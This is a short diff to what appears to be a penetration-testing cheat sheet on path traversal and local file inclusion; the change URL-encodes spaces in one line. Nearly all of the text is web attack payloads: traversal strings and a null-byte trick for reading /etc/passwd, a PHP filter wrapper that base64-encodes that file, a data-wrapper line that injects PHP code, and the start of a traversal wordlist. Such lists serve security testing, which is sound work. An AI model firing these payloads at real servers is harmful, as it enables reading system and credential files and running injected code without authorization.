@@ -20,7 +20,7 @@ ___
 5. Absolute path2 >> /var/www/html/..//..//..//etc/passwd
 6. Using null byte >> ../../../etc/passwd%00.png
 7. Using PHP wrappers >> php://filter/convert.base64-encode/resource=/etc/passwd
-8. Using Data wrappers >> data:text/plain,<?php phpinfo(); ?>
+8. Using Data wrappers >> data:text/plain,<?php%20phpinfo();%20?>
 #### Wordlist
 ```txt
 ../../../etc/passwd
